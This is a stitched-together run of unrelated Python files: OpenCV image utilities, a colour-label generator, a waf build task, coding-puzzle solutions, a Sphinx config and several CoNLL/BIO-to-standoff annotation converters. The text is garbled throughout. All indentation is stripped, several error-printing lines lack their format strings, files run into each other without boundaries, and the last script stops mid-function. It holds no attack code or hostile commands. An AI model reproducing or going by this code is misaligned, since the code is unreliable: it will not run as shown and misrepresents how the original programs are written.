image = cv2.cvtColor(image, cv2.COLOR_BGR2RGB)
plt.figure()
plt.axis("off")
plt.imshow(image)
image = image.reshape((image.shape[0]*image.shape[1], 3))
clt = KMeans(n_clusters=args["clusters"])
clt.fit(image)
hist = centroid_histogram(clt)
bar = plot_colors(hist, clt.cluster_centers_)
plt.figure()
plt.axis("off")
plt.imshow(bar)
plt.show()
from argparse import ArgumentParser, FileType
from colorsys import hls_to_rgb, rgb_to_hls
from sys import stdin, stdout
def _argparser():
argparser = ArgumentParser()
argparser.add_argument('-i', '--input', type=FileType('r'), default=stdin)
argparser.add_argument('-o', '--output', type=FileType('w'), default=stdout)
argparser.add_argument('-c', '--visual-conf', action='store_true')
return argparser
def main(args):
argp = _argparser().parse_args(args[1:])
lbls = [l.rstrip('\n') for l in argp.input]
assert len(lbls) <= 100, 'currently not supporting more than a hundred'
hue, lightness, saturation = rgb_to_hls(1.0, 0.0, 0.0)
lightness += 0.05
hue_step = 1.0 / len(lbls)
for lbl in lbls:
hex_output = '#{:02x}{:02x}{:02x}'.format(*[int(255 * e)
for e in hls_to_rgb(hue, lightness, saturation)])
if argp.visual_conf:
argp.output.write('{}\tbgColor:{}'.format(lbl, hex_output))
else:
argp.output.write(hex_output)
argp.output.write('\n')
hue += hue_step
return 0
if __name__ == '__main__':
from sys import argv
exit(main(argv))
import TaskGen
import Node, Task, Utils, Build
import subprocess
import Options
import shellcmd
from Logs import debug, error
shellcmd.debug = debug
import Task
import re
arg_rx = re.compile(r"(?P<dollar>\$\$)|(?P<subst>\$\{(?P<var>\w+)(?P<code>.*?)\})", re.M)
class command_task(Task.Task):
color = "BLUE"
def __init__(self, env, generator):
Task.Task.__init__(self, env=env, normal=1, generator=generator)
def __str__(self):
"string to display to the user"
env = self.env
src_str = ' '.join([a.nice_path(env) for a in self.inputs])
tgt_str = ' '.join([a.nice_path(env) for a in self.outputs])
if self.outputs:
sep = ' -> '
else:
sep = ''
pipeline = shellcmd.Pipeline()
pipeline.parse(self.generator.command)
cmd = pipeline.get_abbreviated_command()
return 'command (%s): %s%s%s\n' % (cmd, src_str, sep, tgt_str)
def _subst_arg(self, arg, direction, namespace):
def repl(match):
if match.group('dollar'):
return "$"
elif match.group('subst'):
var = match.group('var')
code = match.group('code')
result = eval(var+code, namespace)
if isinstance(result, Node.Node):
if var == 'TGT':
return result.get_bld().abspath()
elif var == 'SRC':
return result.srcpath()
else:
raise ValueError("Bad subst variable %r" % var)
elif result is self.inputs:
if len(self.inputs) == 1:
return result[0].srcpath()
else:
raise ValueError("${SRC} requested but have multiple sources; which one?")
elif result is self.outputs:
if len(self.outputs) == 1:
return result[0].get_bld().abspath()
else:
raise ValueError("${TGT} requested but have multiple targets; which one?")
elif isinstance(result, list):
assert len(result) == 1
return result[0]
else:
return result
return None
return arg_rx.sub(repl, arg)
def run(self):
pipeline = shellcmd.Pipeline()
pipeline.parse(self.generator.command)
namespace = self.env.get_merged_dict()
if self.generator.variables is not None:
namespace.update(self.generator.variables)
namespace.update(env=self.env, SRC=self.inputs, TGT=self.outputs)
for cmd in pipeline.pipeline:
if isinstance(cmd, shellcmd.Command):
if isinstance(cmd.stdin, basestring):
cmd.stdin = self._subst_arg(cmd.stdin, 'in', namespace)
if isinstance(cmd.stdout, basestring):
cmd.stdout = self._subst_arg(cmd.stdout, 'out', namespace)
if isinstance(cmd.stderr, basestring):
cmd.stderr = self._subst_arg(cmd.stderr, 'out', namespace)
for argI in xrange(len(cmd.argv)):
cmd.argv[argI] = self._subst_arg(cmd.argv[argI], None, namespace)
if cmd.env_vars is not None:
env_vars = dict()
for name, value in cmd.env_vars.iteritems():
env_vars[name] = self._subst_arg(value, None, namespace)
cmd.env_vars = env_vars
elif isinstance(cmd, shellcmd.Chdir):
cmd.dir = self._subst_arg(cmd.dir, None, namespace)
return pipeline.run(verbose=(Options.options.verbose > 0))
@TaskGen.taskgen_method
@TaskGen.feature('command')
def init_command(self):
Utils.def_attrs(self,
variables = None,
rule='')
@TaskGen.feature('command')
@TaskGen.after_method('process_rule')
def apply_command(self):
task = self.create_task('command')
setattr(task, "dep_vars", getattr(self, "dep_vars", None))
inputs = []
for node in self.source:
inputs.append(node)
task.set_inputs(inputs)
task.set_outputs([self.path.find_or_declare(tgt) for tgt in self.to_list(self.target)])
self.source = ''
class Solution(object):
def solve_error(self, cipher):
a, b = cipher
m = len(a)
n = len(b)
dp = [[0 for _ in xrange(n + 1)] for _ in xrange(m + 1)]
for i in xrange(1, m + 1):
for j in xrange(1, n + 1):
if a[i - 1] == b[j - 1]:
dp[i][j] = min(dp[i][j - 1], dp[i - 1][j]) + 1
else:
dp[i][j] = max(dp[i][j - 1], dp[i - 1][j])
return dp[-1][-1]
def solve(self, cipher):
a, b = cipher
m = len(a)
n = len(b)
dp = [[0 for _ in xrange(n + 1)] for _ in xrange(m + 1)]
for i in xrange(1, m + 1):
for j in xrange(1, n + 1):
if a[i - 1] == b[j - 1]:
dp[i][j] = dp[i - 1][j - 1] + 1
else:
dp[i][j] = max(dp[i][j - 1], dp[i - 1][j])
return dp[-1][-1]
if __name__ == "__main__":
import sys
f = open("1.in", "r")
cipher = []
cipher.append(f.readline().strip())
cipher.append(f.readline().strip())
s = "%s\n" % (Solution().solve(cipher))
print s,
import numpy as np
import cv2
import os
from contextlib import contextmanager
import itertools as it
image_extensions = ['.bmp', '.jpg', '.jpeg', '.png', '.tif', '.tiff', '.pbm', '.pgm', '.ppm']
class Bunch(object):
def __init__(self, **kw):
self.__dict__.update(kw)
def __str__(self):
return str(self.__dict__)
def splitfn(fn):
path, fn = os.path.split(fn)
name, ext = os.path.splitext(fn)
return path, name, ext
def anorm2(a):
return (a*a).sum(-1)
def anorm(a):
return np.sqrt( anorm2(a) )
def homotrans(H, x, y):
xs = H[0, 0]*x + H[0, 1]*y + H[0, 2]
ys = H[1, 0]*x + H[1, 1]*y + H[1, 2]
s  = H[2, 0]*x + H[2, 1]*y + H[2, 2]
return xs/s, ys/s
def to_rect(a):
a = np.ravel(a)
if len(a) == 2:
a = (0, 0, a[0], a[1])
return np.array(a, np.float64).reshape(2, 2)
def rect2rect_mtx(src, dst):
src, dst = to_rect(src), to_rect(dst)
cx, cy = (dst[1] - dst[0]) / (src[1] - src[0])
tx, ty = dst[0] - src[0] * (cx, cy)
M = np.float64([[ cx,  0, tx],
[  0, cy, ty],
[  0,  0,  1]])
return M
def lookat(eye, target, up = (0, 0, 1)):
fwd = np.asarray(target, np.float64) - eye
fwd /= anorm(fwd)
right = np.cross(fwd, up)
right /= anorm(right)
down = np.cross(fwd, right)
R = np.float64([right, down, fwd])
tvec = -np.dot(R, eye)
return R, tvec
def mtx2rvec(R):
w, u, vt = cv2.SVDecomp(R - np.eye(3))
p = vt[0] + u[:,0]*w[0]
c = np.dot(vt[0], p)
s = np.dot(vt[1], p)
axis = np.cross(vt[0], vt[1])
return axis * np.arctan2(s, c)
def draw_str(dst, (x, y), s):
cv2.putText(dst, s, (x+1, y+1), cv2.FONT_HERSHEY_PLAIN, 1.0, (0, 0, 0), thickness = 2, lineType=cv2.CV_AA)
cv2.putText(dst, s, (x, y), cv2.FONT_HERSHEY_PLAIN, 1.0, (255, 255, 255), lineType=cv2.CV_AA)
class Sketcher:
def __init__(self, windowname, dests, colors_func):
self.prev_pt = None
self.windowname = windowname
self.dests = dests
self.colors_func = colors_func
self.dirty = False
self.show()
cv2.setMouseCallback(self.windowname, self.on_mouse)
def show(self):
cv2.imshow(self.windowname, self.dests[0])
def on_mouse(self, event, x, y, flags, param):
pt = (x, y)
if event == cv2.EVENT_LBUTTONDOWN:
self.prev_pt = pt
if self.prev_pt and flags & cv2.EVENT_FLAG_LBUTTON:
for dst, color in zip(self.dests, self.colors_func()):
cv2.line(dst, self.prev_pt, pt, color, 5)
self.dirty = True
self.prev_pt = pt
self.show()
else:
self.prev_pt = None
_jet_data =   {'red':   ((0., 0, 0), (0.35, 0, 0), (0.66, 1, 1), (0.89,1, 1),
(1, 0.5, 0.5)),
'green': ((0., 0, 0), (0.125,0, 0), (0.375,1, 1), (0.64,1, 1),
(0.91,0,0), (1, 0, 0)),
'blue':  ((0., 0.5, 0.5), (0.11, 1, 1), (0.34, 1, 1), (0.65,0, 0),
(1, 0, 0))}
cmap_data = { 'jet' : _jet_data }
def make_cmap(name, n=256):
data = cmap_data[name]
xs = np.linspace(0.0, 1.0, n)
channels = []
eps = 1e-6
for ch_name in ['blue', 'green', 'red']:
ch_data = data[ch_name]
xp, yp = [], []
for x, y1, y2 in ch_data:
xp += [x, x+eps]
yp += [y1, y2]
ch = np.interp(xs, xp, yp)
channels.append(ch)
return np.uint8(np.array(channels).T*255)
def nothing(*arg, **kw):
pass
def clock():
return cv2.getTickCount() / cv2.getTickFrequency()
@contextmanager
def Timer(msg):
print msg, '...',
start = clock()
try:
yield
finally:
print "%.2f ms" % ((clock()-start)*1000)
class StatValue:
def __init__(self, smooth_coef = 0.5):
self.value = None
self.smooth_coef = smooth_coef
def update(self, v):
if self.value is None:
self.value = v
else:
c = self.smooth_coef
self.value = c * self.value + (1.0-c) * v
class RectSelector:
def __init__(self, win, callback):
self.win = win
self.callback = callback
cv2.setMouseCallback(win, self.onmouse)
self.drag_start = None
self.drag_rect = None
def onmouse(self, event, x, y, flags, param):
x, y = np.int16([x, y])
if event == cv2.EVENT_LBUTTONDOWN:
self.drag_start = (x, y)
if self.drag_start:
if flags & cv2.EVENT_FLAG_LBUTTON:
xo, yo = self.drag_start
x0, y0 = np.minimum([xo, yo], [x, y])
x1, y1 = np.maximum([xo, yo], [x, y])
self.drag_rect = None
if x1-x0 > 0 and y1-y0 > 0:
self.drag_rect = (x0, y0, x1, y1)
else:
rect = self.drag_rect
self.drag_start = None
self.drag_rect = None
if rect:
self.callback(rect)
def draw(self, vis):
if not self.drag_rect:
return False
x0, y0, x1, y1 = self.drag_rect
cv2.rectangle(vis, (x0, y0), (x1, y1), (0, 255, 0), 2)
return True
@property
def dragging(self):
return self.drag_rect is not None
def grouper(n, iterable, fillvalue=None):
args = [iter(iterable)] * n
return it.izip_longest(fillvalue=fillvalue, *args)
def mosaic(w, imgs):
imgs = iter(imgs)
img0 = imgs.next()
pad = np.zeros_like(img0)
imgs = it.chain([img0], imgs)
rows = grouper(w, imgs, pad)
return np.vstack(map(np.hstack, rows))
def getsize(img):
h, w = img.shape[:2]
return w, h
def mdot(*args):
return reduce(np.dot, args)
def draw_keypoints(vis, keypoints, color = (0, 255, 255)):
for kp in keypoints:
x, y = kp.pt
cv2.circle(vis, (int(x), int(y)), 2, color)
class Solution:
def compareStrings(self, A, B):
cnt = [0 for _ in xrange(26)]
for c in A:
cnt[ord(c)-ord('A')] += 1
for c in B:
cnt[ord(c)-ord('A')] -= 1
if cnt[ord(c)-ord('A')]<0:
return False
return True
if __name__=="__main__":
assert Solution().compareStrings("A", "")==True
def wrap_ord(a):
if isinstance(a, str):
return ord(a)
elif isinstance(a, int):
return a
import sys, os
extensions = ['sphinx.ext.pngmath']
templates_path = ['_templates']
source_suffix = '.rst'
master_doc = 'index'
project = u'ns-3'
copyright = u'2008-11, ns-3 project'
version = 'ns-3.13'
release = 'ns-3.13'
today = 'December 23, 2011'
exclude_patterns = []
pygments_style = 'sphinx'
html_theme = 'default'
html_static_path = ['_static']
htmlhelp_basename = 'ns-3doc'
latex_documents = [
('index', 'ns-3-tutorial.tex', u'ns-3 Tutorial',
u'ns-3 project', 'manual'),
]
man_pages = [
('index', 'ns-3-tutorial', u'ns-3 Tutorial',
[u'ns-3 project'], 1)
]
ADMIN_CONTACT_EMAIL = CHANGE_ME
BASE_DIR = CHANGE_ME
DATA_DIR = CHANGE_ME
WORK_DIR = CHANGE_ME
USER_PASSWORD = {
}
MAX_SEARCH_RESULT_NUMBER = 1000
DEBUG = False
TUTORIALS = False
LL_DEBUG, LL_INFO, LL_WARNING, LL_ERROR, LL_CRITICAL = range(5)
LOG_LEVEL = LL_WARNING
try:
assert DATA_DIR != BACKUP_DIR, 'DATA_DIR cannot equal BACKUP_DIR'
except NameError:
pass
from __future__ import with_statement
import sys
import re
import os
import codecs
INPUT_ENCODING = "ASCII"
OUTPUT_ENCODING = "UTF-8"
output_directory = None
def unescape_PTB(s):
return s.replace("-LRB-", "(").replace("-RRB-", ")").replace("-LSB-", "[").replace("-RSB-", "]").replace("-LCB-", "{").replace("-RCB-", "}").replace('``', '"'). replace("''", '"').replace('\\/', '/')
def quote(s):
return s in ('"', )
def space(t1, t2, quote_count = None):
if re.match(r'^[\($]$', t1):
return False
if re.match(r'^[.,;%\)\?\!]$', t2):
return False
if quote(t1) and quote_count is not None and quote_count % 2 == 1:
return False
if quote(t2) and quote_count is not None and quote_count % 2 == 1:
return False
return True
def tagstr(start, end, ttype, idnum, text):
assert '\n' not in text, "ERROR: newline in entity '%s'" % (text)
assert text == text.strip(), "ERROR: tagged span contains extra whitespace: '%s'" % (text)
return "T%d\t%s %d %d\t%s" % (idnum, ttype, start, end, text)
def output(infn, docnum, sentences):
global output_directory
if output_directory is None:
txtout = sys.stdout
soout = sys.stdout
else:
outfn = os.path.join(output_directory, os.path.basename(infn)+'-doc-'+str(docnum))
txtout = codecs.open(outfn+'.txt', 'wt', encoding=OUTPUT_ENCODING)
soout = codecs.open(outfn+'.ann', 'wt', encoding=OUTPUT_ENCODING)
offset, idnum = 0, 1
doctext = ""
for si, sentence in enumerate(sentences):
prev_token = None
prev_tag = "O"
curr_start, curr_type = None, None
quote_count = 0
for token, ttag, ttype in sentence:
if curr_type is not None and (ttag != "I" or ttype != curr_type):
print >> soout, tagstr(curr_start, offset, curr_type, idnum, doctext[curr_start:offset])
idnum += 1
curr_start, curr_type = None, None
if prev_token is not None and space(prev_token, token, quote_count):
doctext = doctext + ' '
offset += 1
if curr_type is None and ttag != "O":
curr_start, curr_type = offset, ttype
doctext = doctext + token
offset += len(token)
if quote(token):
quote_count += 1
prev_token = token
prev_tag = ttag
if curr_type is not None:
print >> soout, tagstr(curr_start, offset, curr_type, idnum, doctext[curr_start:offset])
idnum += 1
if si+1 != len(sentences):
doctext = doctext + '\n'
offset += 1
print >> txtout, doctext
def process(fn):
docnum = 1
sentences = []
with codecs.open(fn, encoding=INPUT_ENCODING) as f:
current = []
lines = f.readlines()
for ln, l in enumerate(lines):
l = l.strip()
if re.match(r'^\s*$', l):
if len(current) > 0:
sentences.append(current)
current = []
if len(sentences) >= 10:
output(fn, docnum, sentences)
sentences = []
docnum += 1
continue
m = re.match(r'^(\S+)\s(\S+)$', l)
if not m:
m = re.match(r'^(\S+)\s\S+\s(\S+)$', l)
assert m, "Error parsing line %d: %s" % (ln+1, l)
token, tag = m.groups()
m = re.match(r'^([BIO])((?:-[A-Za-z_]+)?)$', tag)
assert m, "ERROR: failed to parse tag '%s' in %s" % (tag, fn)
ttag, ttype = m.groups()
if len(ttype) > 0 and ttype[0] == "-":
ttype = ttype[1:]
token = unescape_PTB(token)
current.append((token, ttag, ttype))
if len(current) > 0:
sentences.append(current)
if len(sentences) > 0:
output(fn, docnum, sentences)
def main(argv):
global output_directory
output_directory = None
filenames = argv[1:]
if len(argv) > 2 and argv[1] == "-o":
output_directory = argv[2]
print >> sys.stderr, "Writing output to %s" % output_directory
filenames = argv[3:]
fail_count = 0
for fn in filenames:
try:
process(fn)
except Exception, e:
print >> sys.stderr, "Error processing %s: %s" % (fn, e)
fail_count += 1
if fail_count > 0:
print >> sys.stderr,  % (fail_count, len(filenames))
return 0
if __name__ == "__main__":
sys.exit(main(sys.argv))
from __future__ import with_statement
import sys
import re
import os
import codecs
INPUT_ENCODING = "Latin-1"
OUTPUT_ENCODING = "UTF-8"
output_directory = None
def quote(s):
return s in ('"', )
def space(t1, t2, quote_count = None):
if re.match(r'^[\(]$', t1):
return False
if re.match(r'^[.,\)\?\!]$', t2):
return False
if quote(t1) and quote_count is not None and quote_count % 2 == 1:
return False
if quote(t2) and quote_count is not None and quote_count % 2 == 1:
return False
return True
def tagstr(start, end, ttype, idnum, text):
assert '\n' not in text, "ERROR: newline in entity '%s'" % (text)
assert text == text.strip(), "ERROR: tagged span contains extra whitespace: '%s'" % (text)
return "T%d\t%s %d %d\t%s" % (idnum, ttype, start, end, text)
def output(infn, docnum, sentences):
global output_directory
if output_directory is None:
txtout = sys.stdout
soout = sys.stdout
else:
outfn = os.path.join(output_directory, os.path.basename(infn)+'-doc-'+str(docnum))
txtout = codecs.open(outfn+'.txt', 'wt', encoding=OUTPUT_ENCODING)
soout = codecs.open(outfn+'.ann', 'wt', encoding=OUTPUT_ENCODING)
offset, idnum = 0, 1
doctext = ""
for si, sentence in enumerate(sentences):
prev_token = None
prev_tag = "O"
curr_start, curr_type = None, None
quote_count = 0
for token, ttag, ttype in sentence:
if curr_type is not None and (ttag != "I" or ttype != curr_type):
print >> soout, tagstr(curr_start, offset, curr_type, idnum, doctext[curr_start:offset])
idnum += 1
curr_start, curr_type = None, None
if prev_token is not None and space(prev_token, token, quote_count):
doctext = doctext + ' '
offset += 1
if curr_type is None and ttag != "O":
curr_start, curr_type = offset, ttype
doctext = doctext + token
offset += len(token)
if quote(token):
quote_count += 1
prev_token = token
prev_tag = ttag
if curr_type is not None:
print >> soout, tagstr(curr_start, offset, curr_type, idnum, doctext[curr_start:offset])
idnum += 1
if si+1 != len(sentences):
doctext = doctext + '\n'
offset += 1
print >> txtout, doctext
def process(fn):
docnum = 1
sentences = []
with codecs.open(fn, encoding=INPUT_ENCODING) as f:
current = []
lines = f.readlines()
for ln, l in enumerate(lines):
l = l.strip()
if re.match(r'^\s*$', l):
if len(current) > 0:
sentences.append(current)
current = []
continue
elif (re.match(r'^===*\s+O\s*$', l) or
re.match(r'^-DOCSTART-', l)):
if len(sentences) > 0:
output(fn, docnum, sentences)
sentences = []
docnum += 1
continue
if (ln + 2 < len(lines) and
re.match(r'^\s*$', lines[ln+1]) and
re.match(r'^-+\s+O\s*$', lines[ln+2])):
if len(sentences) > 0:
output(fn, docnum, sentences)
sentences = []
docnum += 1
m = re.match(r'^(\S+)\s(\S+)$', l)
if not m:
m = re.match(r'^(\S+)\s\S+\s(\S+)$', l)
assert m, "Error parsing line %d: %s" % (ln+1, l)
token, tag = m.groups()
m = re.match(r'^([BIO])((?:-[A-Za-z_]+)?)$', tag)
assert m, "ERROR: failed to parse tag '%s' in %s" % (tag, fn)
ttag, ttype = m.groups()
if len(ttype) > 0 and ttype[0] == "-":
ttype = ttype[1:]
current.append((token, ttag, ttype))
if len(current) > 0:
sentences.append(current)
if len(sentences) > 0:
output(fn, docnum, sentences)
def main(argv):
global output_directory
output_directory = None
filenames = argv[1:]
if len(argv) > 2 and argv[1] == "-o":
output_directory = argv[2]
print >> sys.stderr, "Writing output to %s" % output_directory
filenames = argv[3:]
fail_count = 0
for fn in filenames:
try:
process(fn)
except Exception, e:
print >> sys.stderr, "Error processing %s: %s" % (fn, e)
fail_count += 1
if fail_count > 0:
print >> sys.stderr,  % (fail_count, len(filenames))
return 0
if __name__ == "__main__":
sys.exit(main(sys.argv))
from __future__ import with_statement
import sys
import re
import os
import codecs
MAX_DOC_SENTENCES = 10
OUTPUT_ROOT = True
ROOT_STR = 'ROOT'
ROOT_POS = 'ROOT'
ROOT_FEAT = ''
INPUT_ENCODING = "UTF-8"
OUTPUT_ENCODING = "UTF-8"
F_ID, F_FORM, F_LEMMA, F_POS, F_FEAT, F_HEAD, F_DEPREL, F_FILLPRED, F_PRED, F_APRED1 = range(10)
output_directory = None
charmap = {
'<' : '_lt_',
'>' : '_gt_',
'+' : '_plus_',
'?' : '_question_',
'&' : '_amp_',
':' : '_colon_',
'.' : '_period_',
'!' : '_exclamation_',
}
def maptype(s):
return "".join([charmap.get(c,c) for c in s])
def tokstr(start, end, ttype, idnum, text):
assert '\n' not in text, "ERROR: newline in entity '%s'" % (text)
assert text == text.strip(), "ERROR: tagged span contains extra whitespace: '%s'" % (text)
return "T%d\t%s %d %d\t%s" % (idnum, maptype(ttype), start, end, text)
def featstr(lemma, feats, idnum):
return "#%d\tData T%d\tLemma: %s, Feats: %s" % (idnum, idnum, lemma, feats)
def depstr(depid, headid, rel, idnum):
return "R%d\t%s Arg1:T%d Arg2:T%d" % (idnum, maptype(rel), headid, depid)
def output(infn, docnum, sentences):
global output_directory
if output_directory is None:
txtout = codecs.getwriter(OUTPUT_ENCODING)(sys.stdout)
soout = codecs.getwriter(OUTPUT_ENCODING)(sys.stdout)
else:
if MAX_DOC_SENTENCES:
outfnbase = os.path.basename(infn)+'-doc-'+str(docnum)
else:
outfnbase = os.path.basename(infn)
outfn = os.path.join(output_directory, outfnbase)
txtout = codecs.open(outfn+'.txt', 'wt', encoding=OUTPUT_ENCODING)
soout = codecs.open(outfn+'.ann', 'wt', encoding=OUTPUT_ENCODING)
offset, idnum, ridnum = 0, 1, 1
doctext = ""
for si, sentence in enumerate(sentences):
tokens, deps = sentence
idmap = {}
prev_form = None
if OUTPUT_ROOT:
tokens[0] = (ROOT_STR, ROOT_STR, ROOT_POS, ROOT_FEAT)
for id_ in tokens:
form, lemma, pos, feat = tokens[id_]
if prev_form is not None:
doctext = doctext + ' '
offset += 1
print >> soout, tokstr(offset, offset+len(form), pos, idnum, form)
print >> soout, featstr(lemma, feat, idnum)
assert id_ not in idmap, "Error in data: dup ID"
idmap[id_] = idnum
idnum += 1
doctext = doctext + form
offset += len(form)
prev_form = form
for head in deps:
for dep in deps[head]:
for rel in deps[head][dep]:
if not OUTPUT_ROOT and head == 0:
continue
print >> soout, depstr(idmap[dep], idmap[head], rel, ridnum)
ridnum += 1
if si+1 != len(sentences):
doctext = doctext + '\n'
offset += 1
print >> txtout, doctext
def read_sentences(fn):
sentences=[[]]
with codecs.open(fn, 'rU', INPUT_ENCODING) as f:
for line in f:
line=line.rstrip()
if not line:
continue
if line and line[0] == "#":
continue
cols=line.split(u'\t')
if cols[0] == u'1' and sentences[-1]:
sentences.append([])
sentences[-1].append(cols)
return sentences
def resolve_format(sentences, options):
fields = {}
fields[F_ID] = 0
fields[F_FORM] = 1
fields[F_LEMMA] = 2
fields[F_POS] = 4
fields[F_FEAT] = 6
fields[F_HEAD] = 8
fields[F_DEPREL] = 10
fields[F_FILLPRED] = 12
fields[F_PRED] = 13
fields[F_APRED1] = 14
return fields
def mark_dependencies(dependency, head, dependent, deprel):
if head not in dependency:
dependency[head] = {}
if dependent not in dependency[head]:
dependency[head][dependent] = []
dependency[head][dependent].append(deprel)
return dependency
def process_sentence(sentence, fieldmap):
dependency = {}
token = {}
for fields in sentence:
id_ = int(fields[fieldmap[F_ID]])
form = fields[fieldmap[F_FORM]]
lemma = fields[fieldmap[F_LEMMA]]
pos = fields[fieldmap[F_POS]]
feat = fields[fieldmap[F_FEAT]]
try:
head = int(fields[fieldmap[F_HEAD]])
except ValueError:
assert fields[fieldmap[F_HEAD]] == 'ROOT', \
'error: unexpected head: %s' % fields[fieldmap[F_HEAD]]
head = 0
deprel = fields[fieldmap[F_DEPREL]]
mark_dependencies(dependency, head, id_, deprel)
assert id_ not in token
token[id_] = (form, lemma, pos, feat)
return token, dependency
def process(fn, options=None):
docnum = 1
sentences = read_sentences(fn)
fieldmap = resolve_format(sentences, options)
processed = []
for i, sentence in enumerate(sentences):
token, dependency = process_sentence(sentence, fieldmap)
processed.append((token, dependency))
if MAX_DOC_SENTENCES and len(processed) >= MAX_DOC_SENTENCES:
output(fn, docnum, processed)
processed = []
docnum += 1
def main(argv):
global output_directory
output_directory = None
filenames = argv[1:]
if len(argv) > 2 and argv[1] == "-o":
output_directory = argv[2]
print >> sys.stderr, "Writing output to %s" % output_directory
filenames = argv[3:]
fail_count = 0
for fn in filenames:
try:
process(fn)
except Exception, e:
m = unicode(e).encode(OUTPUT_ENCODING)
raise
if fail_count > 0:
print >> sys.stderr,  % (fail_count, len(filenames))
return 0
if __name__ == "__main__":
sys.exit(main(sys.argv))
import sys
import re
import os
import codecs
try:
import psyco
psyco.full()
except:
pass
SEQUENCE_ERROR_RECOVER, SEQUENCE_ERROR_DISCARD, SEQUENCE_ERROR_FAIL = range(3)
SEQUENCE_ERROR_PROCESSING = SEQUENCE_ERROR_RECOVER
out = sys.stdout
reference_directory = None
output_directory = None
def reference_text_filename(fn):
fnbase = os.path.basename(fn)
reffn = os.path.join(reference_directory, fnbase)
if not os.path.exists(reffn):
reffn = re.sub(r'(.*)\..*', r'\1.txt', reffn)
return reffn
def output_filename(fn):
if output_directory is None:
return None
reffn = reference_text_filename(fn)
return os.path.join(output_directory, os.path.basename(reffn).replace(".txt",".a1"))
def process(fn):
global out
reffn = reference_text_filename(fn)
try:
reffile = codecs.open(reffn, "rt", "UTF-8")
except:
print >> sys.stderr, "ERROR: failed to open reference file %s" % reffn
raise
reftext = reffile.read()
reffile.close()
try:
tagfile = codecs.open(fn, "rt", "UTF-8")
except:
print >> sys.stderr, "ERROR: failed to open file %s" % fn
raise
tagtext = tagfile.read()
tagfile.close()
if output_directory is not None:
outfn = output_filename(fn)
out = open(outfn, "wt")
taggedTokens = []
for ln, l in enumerate(tagtext.split('\n')):
if l.strip() == '':
continue
fields = l.split('\t')
assert len(fields) == 7, "Error: expected 7 tab-separated fields on line %d in %s, found %d: %s" % (ln+1, fn, len(fields), l.encode("UTF-8"))
start, end, ttext = fields[0:3]
tag = fields[6]
start, end = int(start), int(end)
m = re.match(r'^([BIO])((?:-[A-Za-z_]+)?)$', tag)
assert m, "ERROR: failed to parse tag '%s' in %s" % (tag, fn)
ttag, ttype = m.groups()
if len(ttype) > 0 and ttype[0] == "-":
ttype = ttype[1:]
assert ((ttype == "" and ttag == "O") or
(ttype != "" and ttag in ("B","I"))), "Error: tag format '%s' in %s" % (tag, fn)
assert reftext[start:end] == ttext, "ERROR: text mismatch for %s on line %d: reference '%s' tagged '%s': %s" % (fn, ln+1, reftext[start:end].encode("UTF-8"), ttext.encode("UTF-8"), l.encode("UTF-8"))
taggedTokens.append((start, end, ttag, ttype))
def entityStr(startOff, endOff, eType, idNum, fullText):
eText = fullText[startOff:endOff]
assert "\n" not in eText, "ERROR: newline in entity in %s: '%s'" % (fn, eText)
assert eText == eText.strip(), "ERROR: entity contains extra whitespace in %s: '%s'" % (fn, eText)
return "T%d\t%s %d %d\t%s" % (idNum, eType, startOff, endOff, eText)
idIdx = 1
prevTag, prevEnd = "O", 0
currType, currStart = None, None
for startoff, endoff, ttag, ttype in taggedTokens:
if prevTag != "O" and ttag == "I" and currType != ttype:
if SEQUENCE_ERROR_PROCESSING == SEQUENCE_ERROR_RECOVER:
ttag = "B"
elif SEQUENCE_ERROR_PROCESSING == SEQUENCE_ERROR_DISCARD:
ttag = "O"
else:
assert SEQUENCE_ERROR_PROCESSING == SEQUENCE_ERROR_FAIL
pass
if prevTag == "O" and ttag == "I":
if SEQUENCE_ERROR_PROCESSING == SEQUENCE_ERROR_RECOVER:
ttag = "B"
elif SEQUENCE_ERROR_PROCESSING == SEQUENCE_ERROR_DISCARD:
ttag = "O"
else:
assert SEQUENCE_ERROR_PROCESSING == SEQUENCE_ERROR_FAIL
pass
if prevTag != "O" and ttag != "I":
assert currType is not None and currStart is not None, "ERROR at %s (%d-%d) in %s" % (reftext[startoff:endoff], startoff, endoff, fn)
print >> out, entityStr(currStart, prevEnd, currType, idIdx, reftext).encode("UTF-8")
idIdx += 1
currType, currStart = None, None
elif prevTag != "O":
assert ttag == "I", "ERROR in %s" % fn
assert currType == ttype, "ERROR: entity of type '%s' continues as type '%s' in %s" % (currType, ttype, fn)
if ttag == "B":
currType, currStart = ttype, startoff
prevTag, prevEnd = ttag, endoff
if prevTag != "O":
print >> out, entityStr(currStart, prevEnd, currType, idIdx, reftext).encode("UTF-8")
if output_directory is not None:
out.close()
def main(argv):
global reference_directory, output_directory
if len(argv) < 3 or argv[1] != "-d":
print >> sys.stderr, "USAGE:", argv[0], "-d REF-DIR [-o OUT-DIR] (FILES|DIR)"
return 1
reference_directory = argv[2]
output_directory = None
filenames = argv[3:]
if len(argv) > 4 and argv[3] == "-o":
output_directory = argv[4]
print >> sys.stderr, "Writing output to %s" % output_directory
filenames = argv[5:]
input_directory = None
if len(filenames) == 1 and os.path.isdir(filenames[0]):
input_directory = filenames[0]
filenames = [os.path.join(input_directory, fn) for fn in os.listdir(input_directory)]
print >> sys.stderr, "Processing %d files in %s ..." % (len(filenames), input_directory)
fail_count = 0
for fn in filenames:
try:
process(fn)
except Exception, e:
print >> sys.stderr, "Error processing %s: %s" % (fn, e)
fail_count += 1
ofn = output_filename(fn)
try:
os.remove(ofn)
except:
pass
if fail_count > 0:
print >> sys.stderr,  % (fail_count, len(filenames))
return 0
if __name__ == "__main__":
sys.exit(main(sys.argv))
from __future__ import with_statement
import sys
import re
import os
import codecs
MAX_DOC_SENTENCES = 10
OUTPUT_ROOT = True
ROOT_STR = 'ROOT'
INPUT_ENCODING = "UTF-8"
OUTPUT_ENCODING = "UTF-8"
output_directory = None
charmap = {
'<' : '_lt_',
'>' : '_gt_',
'+' : '_plus_',
'?' : '_question_',
'&' : '_amp_',
':' : '_colon_',
'.' : '_period_',
'!' : '_exclamation_',
}
def maptype(s):
return "".join([charmap.get(c,c) for c in s])
def tokstr(start, end, ttype, idnum, text):
assert '\n' not in text, "ERROR: newline in entity '%s'" % (text)
assert text == text.strip(), "ERROR: tagged span contains extra whitespace: '%s'" % (text)
return "T%d\t%s %d %d\t%s" % (idnum, maptype(ttype), start, end, text)
def depstr(depid, headid, rel, idnum):
return "R%d\t%s Arg1:T%d Arg2:T%d" % (idnum, maptype(rel), headid, depid)
def output(infn, docnum, sentences):
global output_directory
if output_directory is None:
txtout = sys.stdout
soout = sys.stdout
else:
if MAX_DOC_SENTENCES:
